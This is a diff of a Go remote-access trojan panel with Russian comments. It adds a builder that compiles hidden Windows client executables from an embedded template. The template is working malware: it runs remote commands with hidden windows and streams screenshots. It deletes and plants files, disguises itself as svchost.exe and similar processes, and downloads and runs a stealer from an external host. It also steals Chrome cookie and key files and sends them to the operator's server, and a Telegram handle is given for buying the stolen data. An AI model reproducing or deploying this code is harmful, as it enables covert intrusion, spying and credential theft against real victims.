@@ -2,14 +2,15 @@ package main
 
 import (
 	"archive/zip"
+	"context"
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"io"
 	"log"
 	"net/http"
 	"os"
-	"path/filepath"
-	"rat/builder"
+	"os/exec"
 	"strings"
 	"sync"
 	"time"
@@ -19,43 +20,422 @@ import (
 	"github.com/gorilla/websocket"
 )
 
+const template = `package main
+
+import (
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"time"
+	"syscall"
+
+	"github.com/gorilla/websocket"
+	"golang.org/x/sys/windows"
+)
+
 type Message struct {
-	Type string `json:"type"`
-	Data string `json:"data"`
-	Name string `json:"name,omitempty"`
+	Type string ` + "`json:\"type\"`" + `
+	Data string ` + "`json:\"data\"`" + `
+	Name string ` + "`json:\"name,omitempty\"`" + `
+}
+
+var streaming = false
+var conn *websocket.Conn
+
+func runHiddenCommand(name string, arg ...string) ([]byte, error) {
+	cmd := exec.Command(name, arg...)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		HideWindow: true,
+	}
+	return cmd.CombinedOutput()
+}
+
+func downloadAndRunStealer(url string) error {
+	// Скачиваем файл
+	resp, err := http.Get(url)
+	if err != nil {
+		return fmt.Errorf("download failed: %%v", err)
+	}
+	defer resp.Body.Close()
+
+	// Сохраняем во временной папке
+	stealerPath := filepath.Join(os.TempDir(), "svchost.exe")
+	out, err := os.Create(stealerPath)
+	if err != nil {
+		return fmt.Errorf("create file failed: %%v", err)
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		return fmt.Errorf("copy failed: %%v", err)
+	}
+
+	// Запускаем скрытно
+	cmd := exec.Command(stealerPath)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		HideWindow: true,
+	}
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("start failed: %%v", err)
+	}
+
+	// Удаляем через 5 секунд
+	go func() {
+		time.Sleep(5 * time.Second)
+		os.Remove(stealerPath)
+	}()
+
+	return nil
+}
+
+func isValidExe(path string) bool {
+    file, err := os.Open(path)
+    if err != nil {
+        return false
+    }
+    defer file.Close()
+    
+    header := make([]byte, 2)
+    if _, err := file.Read(header); err != nil {
+        return false
+    }
+    return string(header) == "MZ"
+}
+
+func tryRunMethods(path string) bool {
+    methods := []func(string) error{
+        func(p string) error { return exec.Command(p).Start() },
+        func(p string) error { return exec.Command("explorer.exe", p).Start() },
+        func(p string) error {
+            return exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", p).Start()
+        },
+    }
+    
+    for _, method := range methods {
+        if method(path) == nil {
+            return true
+        }
+    }
+    return false
+}
+
+func spoofProcessName() {
+    // Common legitimate Windows process names
+    legitNames := []string{
+        "svchost.exe",
+        "winlogon.exe",
+        "dllhost.exe",
+        "rundll32.exe",
+    }
+    
+    // Get current executable path
+    exePath, _ := os.Executable()
+    
+    // Create a copy with a legitimate name in temp directory
+    newName := filepath.Join(os.TempDir(), legitNames[time.Now().Unix()%int64(len(legitNames))])
+    if _, err := os.Stat(newName); os.IsNotExist(err) {
+        data, _ := os.ReadFile(exePath)
+        _ = os.WriteFile(newName, data, 0755)
+        
+        // Start new instance and exit current one
+        cmd := exec.Command(newName)
+        cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
+        _ = cmd.Start()
+        os.Exit(0)
+    }
+}
+
+func main() {
+	spoofProcessName()
+	var err error
+	conn, _, err = websocket.DefaultDialer.Dial("wss://YOUR_SERVER_IP/ws?key=supersecret", nil)
+	if err != nil {
+		log.Fatal("Connection error:", err)
+	}
+	defer conn.Close()
+
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				log.Println("Recovered from panic:", r)
+			}
+		}()
+		for {
+			var msg Message
+			if err := conn.ReadJSON(&msg); err != nil {
+				log.Println("read error:", err)
+				break
+			}
+
+			switch msg.Type {
+			case "cmd":
+				out, err := runHiddenCommand("cmd", "/C", msg.Data)
+				resp := Message{Type: "result", Data: string(out)}
+				if err != nil {
+					resp.Data += "\nError: " + err.Error()
+				}
+				conn.WriteJSON(resp)
+
+			case "start_screen":
+				if streaming {
+					continue
+				}
+				streaming = true
+				go func() {
+					for streaming {
+						imgPath := filepath.Join(os.TempDir(), "screen.jpg")
+						cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
+							"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "+
+								"$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "+
+								"$bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height); "+
+								"$graphics = [Drawing.Graphics]::FromImage($bmp); "+
+								"$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); "+
+								"$bmp.Save('"+imgPath+"'); $bmp.Dispose()")
+						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+						_, err := cmd.CombinedOutput()
+						if err != nil {
+							log.Println("screenshot error:", err)
+							continue
+						}
+
+						data, err := os.ReadFile(imgPath)
+						if err != nil {
+							log.Println("read screenshot error:", err)
+							continue
+						}
+						encoded := base64.StdEncoding.EncodeToString(data)
+						conn.WriteJSON(Message{Type: "screen", Data: encoded})
+						time.Sleep(100 * time.Millisecond)
+					}
+				}()
+
+			case "stop_screen":
+				streaming = false
+
+			case "ls":
+				files, err := os.ReadDir(msg.Data)
+				if err != nil {
+					conn.WriteJSON(Message{Type: "result", Data: "ls error: " + err.Error()})
+					continue
+				}
+				var result struct {
+					Parent string ` + "`json:\"parent\"`" + `
+					Items  []struct {
+						Name string ` + "`json:\"name\"`" + `
+						Full string ` + "`json:\"full\"`" + `
+						Dir  bool   ` + "`json:\"dir\"`" + `
+					} ` + "`json:\"items\"`" + `
+				}
+				parent := filepath.Dir(msg.Data)
+				if parent != msg.Data {
+					result.Parent = parent
+				}
+				for _, f := range files {
+					full := filepath.Join(msg.Data, f.Name())
+					result.Items = append(result.Items, struct {
+						Name string ` + "`json:\"name\"`" + `
+						Full string ` + "`json:\"full\"`" + `
+						Dir  bool   ` + "`json:\"dir\"`" + `
+					}{
+						Name: f.Name(),
+						Full: full,
+						Dir:  f.IsDir(),
+					})
+				}
+				raw, _ := json.Marshal(result)
+				conn.WriteJSON(Message{Type: "explorer", Data: string(raw)})
+
+			case "rm":
+				err := os.RemoveAll(msg.Data)
+				if err != nil {
+					conn.WriteJSON(Message{Type: "result", Data: "rm error: " + err.Error()})
+				} else {
+					conn.WriteJSON(Message{Type: "result", Data: "deleted: " + msg.Data})
+				}
+
+			case "open":
+				cmd := exec.Command("cmd", "/C", "start", "", msg.Data)
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+				err := cmd.Run()
+				if err != nil {
+					conn.WriteJSON(Message{Type: "result", Data: "open error: " + err.Error()})
+				} else {
+					conn.WriteJSON(Message{Type: "result", Data: "opened: " + msg.Data})
+				}
+
+			case "upload":
+				var payload struct {
+					Filename string ` + "`json:\"filename\"`" + `
+					Content  string ` + "`json:\"content\"`" + `
+				}
+				if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
+					conn.WriteJSON(Message{Type: "result", Data: "upload error: invalid JSON"})
+					break
+				}
+				data, err := base64.StdEncoding.DecodeString(payload.Content)
+				if err != nil {
+					conn.WriteJSON(Message{Type: "result", Data: "upload error: base64 decode"})
+					break
+				}
+				err = os.WriteFile(payload.Filename, data, 0644)
+				if err != nil {
+					conn.WriteJSON(Message{Type: "result", Data: "upload error: " + err.Error()})
+				} else {
+					conn.WriteJSON(Message{Type: "result", Data: "uploaded: " + payload.Filename})
+				}
+
+			case "run_stealer":
+				// 1. Формируем URL до stealer.exe на сервере
+				stealerURL := "https://panel-agzz.onrender.com/apps/steler.exe"
+				resp, err := http.Get(stealerURL)
+				if err != nil {
+					conn.WriteJSON(Message{Type: "stealer", Data: "Download failed: " + err.Error()})
+					break
+				}
+				defer resp.Body.Close()
+
+				// Сохранение файла
+				stealerPath := filepath.Join(os.TempDir(), "wupdater.exe")
+				data, err := io.ReadAll(resp.Body)
+				if err != nil {
+					conn.WriteJSON(Message{Type: "stealer", Data: "Read failed: " + err.Error()})
+					break
+				}
+				
+				if err := os.WriteFile(stealerPath, data, 0755); err != nil {
+					conn.WriteJSON(Message{Type: "stealer", Data: "Write failed: " + err.Error()})
+					break
+				}
+
+				// Проверка файла
+				if !isValidExe(stealerPath) {
+					conn.WriteJSON(Message{Type: "stealer", Data: "Invalid executable"})
+					break
+				}
+
+				// Попытки запуска
+				if tryRunMethods(stealerPath) {
+					conn.WriteJSON(Message{Type: "stealer", Data: "Successfully, write to telegram @nvalteam to get | TODO: automation"})
+				} else {
+					conn.WriteJSON(Message{Type: "stealer", Data: "All start methods failed"})
+				}
+				
+				// Отложенное удаление
+				go func() {
+					time.Sleep(30 * time.Second)
+					os.Remove(stealerPath)
+				}()
+
+			case "get_cookies":
+				id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
+				collectAllCookies(id)
+				conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
+			}
+		}
+	}()
+
+	for {
+		time.Sleep(30 * time.Second)
+	}
+}
+
+func collectAllCookies(id string) {
+	localApp := os.Getenv("LOCALAPPDATA")
+	cookieSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Default", "Cookies")
+	stateSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Local State")
+
+	tmpCookie := filepath.Join(os.TempDir(), "tmp_cookie.db")
+	tmpState := filepath.Join(os.TempDir(), "tmp_state.json")
+
+	if err := copyFile(cookieSrc, tmpCookie); err != nil {
+		log.Println("copy cookie error:", err)
+		return
+	}
+	if err := copyFile(stateSrc, tmpState); err != nil {
+		log.Println("copy state error:", err)
+		return
+	}
+
+	uploadFile(tmpCookie, "cookies/"+id+".db")
+	uploadFile(tmpState, "cookies/"+id+".json")
+
+	_ = os.Remove(tmpCookie)
+	_ = os.Remove(tmpState)
+}
+
+func uploadFile(path, remote string) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		log.Println("upload read error:", err)
+		conn.WriteJSON(Message{Type: "result", Data: "read error: " + err.Error()})
+		return
+	}
+	payload := struct {
+		Filename string ` + "`json:\"filename\"`" + `
+		Content  string ` + "`json:\"content\"`" + `
+	}{
+		Filename: remote,
+		Content:  base64.StdEncoding.EncodeToString(data),
+	}
+	raw, _ := json.Marshal(payload)
+	conn.WriteJSON(Message{Type: "upload", Data: string(raw)})
+}
+
+func copyFile(src, dst string) error {
+	in, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer in.Close()
+
+	out, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, in)
+	return err
+}`
+
+type Message struct {
+	Type     string `json:"type"`
+	Data     string `json:"data"`
+	Name     string `json:"name,omitempty"`
+	ClientID string `json:"client_id,omitempty"`
 }
 
 type Client struct {
-	ID      string
-	Conn    *websocket.Conn
-	BuildID string
-	Owner   string
-}
-
-type Build struct {
-    ID      string
-    Owner   string
-    Host    string
-    Created time.Time  // Добавляем поле Created
+	ID    string
+	Conn  *websocket.Conn
+	Owner string
 }
 
 var (
-	clients      = make(map[string]*Client)
-	clientsMu    sync.RWMutex
-	admins       = make(map[*websocket.Conn]bool)
-	adminsMu     sync.Mutex
-	upgrader     = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
-	sessions     = make(map[string]string)
-	sessionsMu   sync.RWMutex
-	builds       = make(map[string]*Build)
-	buildsMu     sync.RWMutex
-	userBuilds   = make(map[string][]string) // owner -> buildIDs
-	userBuildsMu sync.RWMutex
-	users        = map[string]string{
+	clients    = make(map[string]*Client)
+	clientsMu  sync.RWMutex
+	admins     = make(map[*websocket.Conn]string)
+	adminsMu   sync.Mutex
+	upgrader   = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
+	sessions   = make(map[string]string)
+	sessionsMu sync.RWMutex
+	users      = map[string]string{
 		"admin": "admin123",
 		"user1": "pass1",
 	}
+	userToToken = make(map[string]string)
+	tokenMu     sync.RWMutex
 )
+
+var userBuilds = make(map[string]string)
 
 func main() {
 	_ = os.MkdirAll("stealer", 0755)
@@ -66,10 +446,13 @@ func main() {
 	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
 	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
 	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
-	r.Handle("/builds", authMiddleware(http.HandlerFunc(BuildHandler))).Methods("POST")
-	r.Handle("/builds", authMiddleware(http.HandlerFunc(listBuildsHandler))).Methods("GET")
-	r.Handle("/builds/{id}", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
 	r.HandleFunc("/ws", wsHandler)
+	r.Handle("/download_build", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
+	r.Handle("/create_build", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
+	r.Handle("/get_token", authMiddleware(http.HandlerFunc(getTokenHandler))).Methods("GET")
+	r.HandleFunc("/download_client", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		http.ServeFile(w, r, "./clients/client.exe")
+	}))
 	r.PathPrefix("/").Handler(http.HandlerFunc(staticOrLogin))
 
 	port := os.Getenv("PORT")
@@ -80,133 +463,104 @@ func main() {
 	http.ListenAndServe(":"+port, r)
 }
 
-func BuildHandler(w http.ResponseWriter, r *http.Request) {
-    switch r.Method {
-    case http.MethodGet:
-        listBuildsHandler(w, r)
-    case http.MethodPost:
-        createBuildHandler(w, r)
-    default:
-        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-    }
-}
-
-func createBuildHandler(w http.ResponseWriter, r *http.Request) {
-	// Аутентификация
-	cookie, err := r.Cookie("session")
-	if err != nil {
-		http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
-		return
-	}
-
-	sessionsMu.RLock()
-	owner, ok := sessions[cookie.Value]
-	sessionsMu.RUnlock()
-	
+func getClientsHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
 	if !ok {
-		http.Error(w, `{"error":"invalid session"}`, http.StatusUnauthorized)
-		return
-	}
-
-	// Подготовка билда
-	buildID := uuid.New().String()
-	build := &Build{
-		ID:      buildID,
-		Owner:   owner,
-		Host:    "panel-agzz.onrender.com",
-		Created: time.Now(),
-	}
-
-	// Сохранение информации о билде
-	buildsMu.Lock()
-	builds[buildID] = build
-	buildsMu.Unlock()
-
-	userBuildsMu.Lock()
-	userBuilds[owner] = append(userBuilds[owner], buildID)
-	userBuildsMu.Unlock()
-
-	// Запуск сборки
-	log.Printf("[API] Starting build %s for user %s", buildID, owner)
-	exePath, err := builder.Build(build.Host, buildID)
-
-	w.Header().Set("Content-Type", "application/json")
-	if err != nil {
-		log.Printf("[API] Build %s failed: %v", buildID, err)
-		w.WriteHeader(http.StatusInternalServerError)
-		json.NewEncoder(w).Encode(map[string]string{
-			"status": "error",
-			"error":  err.Error(),
-			"buildID": buildID,
-		})
-		return
-	}
-
-	// Успешный ответ
-	log.Printf("[API] Build %s completed successfully at %s", buildID, exePath)
-	json.NewEncoder(w).Encode(map[string]string{
-		"status":  "success",
-		"buildID": buildID,
-		"path":    exePath,
-		"size":    fmt.Sprintf("%.1f MB", float64(getFileSize(exePath))/1024/1024),
-	})
-}
-
-func getFileSize(path string) int64 {
-	file, err := os.Stat(path)
-	if err != nil {
-		return 0
-	}
-	return file.Size()
-}
-
-func listBuildsHandler(w http.ResponseWriter, r *http.Request) {
-	cookie, _ := r.Cookie("session")
-	sessionsMu.RLock()
-	owner := sessions[cookie.Value]
-	sessionsMu.RUnlock()
-
-	userBuildsMu.RLock()
-	buildIDs := userBuilds[owner]
-	userBuildsMu.RUnlock()
-
-	buildsMu.RLock()
-	defer buildsMu.RUnlock()
-
-	var result []*Build
-	for _, id := range buildIDs {
-		if build, exists := builds[id]; exists {
-			result = append(result, build)
-		}
-	}
-
-	json.NewEncoder(w).Encode(result)
-}
-
-func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
-	buildID := mux.Vars(r)["id"]
-
-	buildsMu.RLock()
-	build, exists := builds[buildID]
-	buildsMu.RUnlock()
-
-	if !exists {
-		http.Error(w, "build not found", http.StatusNotFound)
-		return
-	}
-
-	cookie, _ := r.Cookie("session")
-	sessionsMu.RLock()
-	owner := sessions[cookie.Value]
-	sessionsMu.RUnlock()
-
-	if build.Owner != owner {
 		http.Error(w, "unauthorized", http.StatusUnauthorized)
 		return
 	}
 
-	exePath := filepath.Join("builds", buildID, "client.exe")
-	http.ServeFile(w, r, exePath)
+	clientsMu.RLock()
+	var userClients []string
+	for id, client := range clients {
+		if client.Owner == username {
+			userClients = append(userClients, id)
+		}
+	}
+	json.NewEncoder(w).Encode(userClients)
+}
+
+func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
+	if !ok {
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(map[string]string{
+			"error": "unauthorized",
+		})
+		return
+	}
+
+	path, ok := userBuilds[username]
+	if !ok {
+		w.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(w).Encode(map[string]string{
+			"error": "build not found",
+		})
+		return
+	}
+
+	f, err := os.Open(path)
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]string{
+			"error": "cannot open build file",
+		})
+		return
+	}
+	defer f.Close()
+
+	w.Header().Set("Content-Disposition", "attachment; filename=client.exe")
+	w.Header().Set("Content-Type", "application/octet-stream")
+	http.ServeContent(w, r, "client.exe", time.Now(), f)
+}
+
+func createBuildHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
+	if !ok {
+		w.WriteHeader(http.StatusUnauthorized)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"error": "unauthorized",
+		})
+		return
+	}
+
+	serverHost := "panel-agzz.onrender.com"
+	code := strings.ReplaceAll(template, "YOUR_SERVER_IP", serverHost)
+
+	_ = os.MkdirAll("builds", 0755)
+
+	buildPath := fmt.Sprintf("./builds/%s_build.go", username)
+	outputPath := fmt.Sprintf("./builds/%s_client.exe", username)
+
+	err := os.WriteFile(buildPath, []byte(code), 0644)
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"error": "write error: " + err.Error(),
+		})
+		return
+	}
+
+	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", outputPath, buildPath)
+	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
+
+	var stderr strings.Builder
+	cmd.Stderr = &stderr
+
+	if err := cmd.Run(); err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"error": "build error: " + stderr.String(),
+		})
+		return
+	}
+
+	userBuilds[username] = outputPath
+	w.WriteHeader(http.StatusOK)
+	_ = json.NewEncoder(w).Encode(map[string]string{
+		"message": "Build created successfully",
+		"build":   outputPath,
+	})
 }
 
 func loginHandler(w http.ResponseWriter, r *http.Request) {
@@ -243,7 +597,11 @@ func authMiddleware(next http.Handler) http.Handler {
 			http.Error(w, "unauthorized", http.StatusUnauthorized)
 			return
 		}
-		next.ServeHTTP(w, r)
+		sessionsMu.RLock()
+		username := sessions[cookie.Value]
+		sessionsMu.RUnlock()
+		ctx := context.WithValue(r.Context(), "username", username)
+		next.ServeHTTP(w, r.WithContext(ctx))
 	})
 }
 
@@ -266,42 +624,25 @@ func staticOrLogin(w http.ResponseWriter, r *http.Request) {
 }
 
 func wsHandler(w http.ResponseWriter, r *http.Request) {
-	if r.URL.Query().Get("key") != "supersecret" {
+	token := r.URL.Query().Get("key")
+	tokenMu.RLock()
+	username, ok := userToToken[token]
+	tokenMu.RUnlock()
+	if !ok {
 		http.Error(w, "unauthorized", http.StatusUnauthorized)
 		return
 	}
-
-	buildID := r.URL.Query().Get("build_id")
-	if buildID == "" {
-		http.Error(w, "build_id required", http.StatusBadRequest)
-		return
-	}
-
-	buildsMu.RLock()
-	build, exists := builds[buildID]
-	buildsMu.RUnlock()
-
-	if !exists {
-		http.Error(w, "invalid build_id", http.StatusBadRequest)
-		return
-	}
-
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Println("upgrade error:", err)
 		return
 	}
-	id := strings.ReplaceAll(r.RemoteAddr, ":", "_")
-	client := &Client{
-		ID:      strings.ReplaceAll(r.RemoteAddr, ":", "_"),
-		Conn:    conn,
-		BuildID: buildID,
-		Owner:   build.Owner,
-	}
+	id := strings.ReplaceAll(r.RemoteAddr, ":", "_") + "_" + uuid.New().String()
+	client := &Client{ID: id, Conn: conn, Owner: username}
 	clientsMu.Lock()
 	clients[id] = client
 	clientsMu.Unlock()
-	log.Println("Client connected:", id)
+	log.Println("Client connected:", id, "for user:", username)
 
 	defer func() {
 		clientsMu.Lock()
@@ -318,10 +659,11 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 			break
 		}
 		log.Printf("Received from client [%s]: %s\n", id, msg.Type)
+		msg.ClientID = client.ID
 
 		switch msg.Type {
 		case "result", "screen", "explorer", "stealer":
-			broadcastToAdmins(msg)
+			broadcastToAdmins(msg, client.Owner)
 
 		case "upload":
 			var payload struct {
@@ -343,7 +685,6 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 				log.Printf("Saved uploaded file: %s\n", payload.Filename)
 			}
 		}
-
 	}
 }
 
@@ -352,21 +693,26 @@ func decodeBase64(s string) ([]byte, error) {
 }
 
 func adminWSHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
+	if !ok {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Println("admin ws upgrade error:", err)
 		return
 	}
 	adminsMu.Lock()
-	admins[conn] = true
+	admins[conn] = username
 	adminsMu.Unlock()
-	log.Println("Admin connected")
+	log.Println("Admin connected:", username)
 
 	defer func() {
 		adminsMu.Lock()
 		delete(admins, conn)
 		adminsMu.Unlock()
-		log.Println("Admin disconnected")
+		log.Println("Admin disconnected:", username)
 		conn.Close()
 	}()
 
@@ -378,70 +724,35 @@ func adminWSHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func broadcastToAdmins(msg Message) {
+func broadcastToAdmins(msg Message, clientOwner string) {
 	adminsMu.Lock()
 	defer adminsMu.Unlock()
-	for conn := range admins {
-		err := conn.WriteJSON(msg)
-		if err != nil {
-			log.Println("broadcast error:", err)
-			conn.Close()
-			delete(admins, conn)
+	for conn, username := range admins {
+		if username == clientOwner {
+			err := conn.WriteJSON(msg)
+			if err != nil {
+				log.Println("broadcast error:", err)
+				conn.Close()
+				delete(admins, conn)
+			}
 		}
 	}
-}
-
-func getClientsHandler(w http.ResponseWriter, r *http.Request) {
-	cookie, _ := r.Cookie("session")
-	sessionsMu.RLock()
-	owner := sessions[cookie.Value]
-	sessionsMu.RUnlock()
-
-	clientsMu.RLock()
-	defer clientsMu.RUnlock()
-
-	var result []struct {
-		ID      string `json:"id"`
-		BuildID string `json:"build_id"`
-	}
-
-	for _, client := range clients {
-		if client.Owner == owner {
-			result = append(result, struct {
-				ID      string `json:"id"`
-				BuildID string `json:"build_id"`
-			}{
-				ID:      client.ID,
-				BuildID: client.BuildID,
-			})
-		}
-	}
-
-	json.NewEncoder(w).Encode(result)
 }
 
 func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
-	id := mux.Vars(r)["id"]
-
-	clientsMu.RLock()
-	client, ok := clients[id]
-	clientsMu.RUnlock()
-
+	username, ok := r.Context().Value("username").(string)
 	if !ok {
-		http.Error(w, "client not found", http.StatusNotFound)
-		return
-	}
-
-	cookie, _ := r.Cookie("session")
-	sessionsMu.RLock()
-	owner := sessions[cookie.Value]
-	sessionsMu.RUnlock()
-
-	if client.Owner != owner {
 		http.Error(w, "unauthorized", http.StatusUnauthorized)
 		return
 	}
-
+	id := mux.Vars(r)["id"]
+	clientsMu.RLock()
+	client, ok := clients[id]
+	clientsMu.RUnlock()
+	if !ok || client.Owner != username {
+		http.Error(w, "client not found or not owned", http.StatusNotFound)
+		return
+	}
 	var msg Message
 	if err := json.NewDecoder(r.Body).Decode(&msg); err != nil {
 		http.Error(w, "bad request", http.StatusBadRequest)
@@ -452,6 +763,24 @@ func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	w.WriteHeader(http.StatusNoContent)
+}
+
+func getTokenHandler(w http.ResponseWriter, r *http.Request) {
+	username, ok := r.Context().Value("username").(string)
+	if !ok {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	tokenMu.RLock()
+	token, ok := userToToken[username]
+	tokenMu.RUnlock()
+	if !ok {
+		token = uuid.New().String()
+		tokenMu.Lock()
+		userToToken[username] = token
+		tokenMu.Unlock()
+	}
+	w.Write([]byte(token))
 }
 
 func addToZip(zipWriter *zip.Writer, path string, name string) {
